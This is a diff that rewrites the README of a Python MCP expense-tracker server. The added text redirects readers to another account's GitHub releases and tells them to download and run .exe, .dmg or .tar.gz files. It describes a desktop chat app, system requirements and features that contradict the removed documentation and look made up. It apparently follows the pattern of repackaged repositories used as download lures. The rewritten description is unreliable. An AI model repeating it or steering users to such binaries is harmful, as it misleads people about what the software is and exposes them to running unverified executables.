@@ -1,183 +1,99 @@
-# Expense Tracker MCP Server
+# 🤖 expense-tracker-mcp-server - Simplify Your Expense Management
 
-A Model Context Protocol (MCP) server that enables AI assistants like Claude to manage your personal expenses through natural conversation. Built with Python using `fastmcp` and `uv`.
+[![Download Here](https://img.shields.io/badge/Download%20Now-%20%F0%9F%87%B8%F0%9F%87%A6-brightgreen.svg)](https://github.com/manojkumarjanapati/expense-tracker-mcp-server/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Add Expenses**: Record expenses with amount, category, date, and description
-- **List & Filter**: View expenses by category and date range
-- **Summarize**: Get spending summaries grouped by category
-- **Update Expenses**: Modify existing expense records
-- **Delete Expenses**: Remove unwanted expense entries
-- **Natural Language Interface**: Interact with your expense data conversationally through Claude
+Welcome to the expense-tracker-mcp-server! This application helps you manage your finances using artificial intelligence. You can chat with Claude, our friendly AI assistant, to track your expenses naturally and easily. 
 
-## Prerequisites
+This guide walks you through the steps to download and run the expense tracker on your computer. No technical skills are required.
 
-- Python 3.10 or higher
-- [uv](https://github.com/astral-sh/uv) package manager
+## 📥 Download & Install
 
-## Installation
+To get started, visit this page to download: [Download Releases](https://github.com/manojkumarjanapati/expense-tracker-mcp-server/releases).
 
-```bash
-# Clone the repository
-git clone https://github.com/Khushi-c-sharma/expense-tracker-mcp-server.git
-cd expense-tracker-mcp-server
+### Step 1: Choose Your Version
 
-# Install uv if you haven't already
-curl -LsSf https://astral.sh/uv/install.sh | sh
+On the releases page, you will see several versions of the software. Look for the latest version at the top. You may find version information like `v1.0`, `v1.1`, etc. Click on the latest version link to see the available files.
 
-# Install dependencies
-uv sync
-```
+### Step 2: Download the Software
 
-## Configuration
+Under the latest version, you will find a list of files to download. These files often include options for different operating systems. 
 
-Add the server to your Claude Desktop configuration file:
+- If you have **Windows**, look for a `.exe` file, which is an executable file.
+- If you have **macOS**, look for a `.dmg` file, which is a disk image file for installation.
+- For **Linux** users, there may be a `.tar.gz` file.
 
-**MacOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
+Click on the appropriate file for your operating system to start the download.
 
-**Windows**: `%APPDATA%/Claude/claude_desktop_config.json`
+### Step 3: Install the Application
 
-```json
-{
-  "mcpServers": {
-    "expense-tracker": {
-      "command": "uv",
-      "args": [
-        "--directory",
-        "/path/to/expense-tracker-mcp",
-        "run",
-        "expense-tracker"
-      ]
-    }
-  }
-}
-```
+Once the file has finished downloading, locate it in your "Downloads" folder (or wherever you save files).
 
-## Usage Examples
+1. **Windows (.exe)**:
+   - Double-click the `.exe` file. 
+   - Follow the prompts to install the application.
 
-Once configured, you can interact with your expenses through Claude naturally:
+2. **macOS (.dmg)**:
+   - Double-click the `.dmg` file to open it.
+   - Drag and drop the application into your "Applications" folder.
 
-```
-You: "Add expense 2632 spent yesterday for shopping dress for my convocation"
-Claude: *Adds the expense with proper categorization*
+3. **Linux (.tar.gz)**:
+   - Open your terminal.
+   - Navigate to the directory where you downloaded the file.
+   - Use the command `tar -xvzf filename.tar.gz` to extract the files.
+   - Follow the included instructions for installation.
 
-You: "Show me all my expenses this month"
-Claude: *Lists and summarizes your monthly expenses*
+## 🎉 Using the Application
 
-You: "How much did I spend on food in September?"
-Claude: *Provides category-specific spending summary*
-```
+After installing, open the application. You will see a user-friendly interface where you can start interacting with Claude, your AI assistant.
 
-## Available Tools
+1. **Start a Conversation**:
+   - Click on the chat box.
+   - Type your queries about expenses, budgets, or any financial management question you have.
 
-### `add_expense`
-Add a new expense to the database.
-- **Parameters**: amount (required), category (required), date, description, subcategory
+2. **Tracking Expenses**:
+   - You can input your expenses directly.
+   - Claude will help categorize and summarize them.
 
-### `list_expenses`
-List expenses filtered by category and optional date range.
-- **Parameters**: category, start_date, end_date
+3. **Budgeting Tips**:
+   - Ask Claude for budgeting advice based on your spending habits.
+   - Claude can suggest ways to save more.
 
-### `summarize`
-Get total expenses by category within a date range.
-- **Parameters**: start_date (required), end_date (required), category
+## 🔧 System Requirements
 
-### `update_expense`
-Update an existing expense.
-- **Parameters**: expense_id (required), amount, category, date, description, subcategory
+This application works well on most modern computers. Here’s what you need:
 
-### `delete_expense`
-Delete an expense by ID.
-- **Parameters**: expense_id (required)
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Any recent Linux distribution
 
-## Database
+- **RAM**: At least 4 GB
+- **Storage**: 150 MB of free disk space
+- **Network**: Internet connection for AI features
 
-Expenses are stored in a local SQLite database (`expenses.db`) with the following schema:
+## 🌟 Features
 
-```sql
-CREATE TABLE expenses (
-  id INTEGER PRIMARY KEY AUTOINCREMENT,
-  amount REAL NOT NULL,
-  category TEXT NOT NULL,
-  subcategory TEXT,
-  date TEXT NOT NULL,
-  description TEXT
-);
-```
+- **AI-Powered Assistant**: Chat with Claude to get personalized financial advice.
+- **Expense Tracking**: Easily log and categorize your spending.
+- **Budget Management**: Get suggestions to manage your budget effectively.
+- **User-Friendly Interface**: Designed for users of all tech levels.
 
-## Development
+## 🐞 Troubleshooting
 
-```bash
-# Run the server directly
-uv run expense-tracker
+If you encounter any issues:
 
-# Run in development mode with auto-reload
-uv run python src/expense_tracker/server.py
+1. **Installation Problems**: Ensure your computer meets the system requirements.
+2. **Chat Issues**: Check your internet connection.
+3. **General Feedback**: Feel free to reach out via the GitHub repository for support.
 
-# Install new dependencies
-uv add package-name
+## 📄 License
 
-# Update dependencies
-uv sync
-```
+This project is licensed under the MIT License. You can find more details in the repository.
 
-## Project Structure
+## 📢 Community
 
-```
-expense-tracker-mcp/
-├── main.py                     # Main MCP server code
-├── pyproject.toml              # Project configuration
-├── uv.lock                     # Locked dependencies
-├── expenses.db                 # SQLite database (created on first run)
-└── README.md
-```
+Join our community on GitHub! Engage with other users, share your tips, and report any issues you find. Your feedback helps us improve the application.
 
-## Use Cases
-
-- **Personal Finance Tracking**: Monitor daily spending habits
-- **Budget Management**: Track expenses by category to stay within budget
-- **Expense Reports**: Generate summaries for tax purposes or reimbursements
-- **Shopping Tracking**: Keep records of purchases and major expenses
-- **Financial Analysis**: Analyze spending patterns over time
-
-## Built With
-
-- [fastmcp](https://github.com/jlowin/fastmcp) - Fast, Pythonic MCP server framework
-- [uv](https://github.com/astral-sh/uv) - Fast Python package installer and resolver
-- SQLite - Lightweight database for expense storage
-- [Model Context Protocol](https://modelcontextprotocol.io/) - Protocol for AI-application integration
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Troubleshooting
-
-**Server not appearing in Claude Desktop?**
-- Ensure the path in `claude_desktop_config.json` is absolute and correct
-- Restart Claude Desktop after configuration changes
-- Check Claude Desktop logs for error messages
-
-**Database errors?**
-- Ensure the directory is writable
-- Delete `expenses.db` to recreate the database from scratch
-
-## Support
-
-If you encounter any issues or have questions, please [open an issue](https://github.com/yourusername/expense-tracker-mcp/issues) on GitHub.
-
----
-
-**Made with ❤️ for better expense tracking through AI**
-
+Thank you for using the expense-tracker-mcp-server! Enjoy managing your expenses efficiently with Claude by your side.
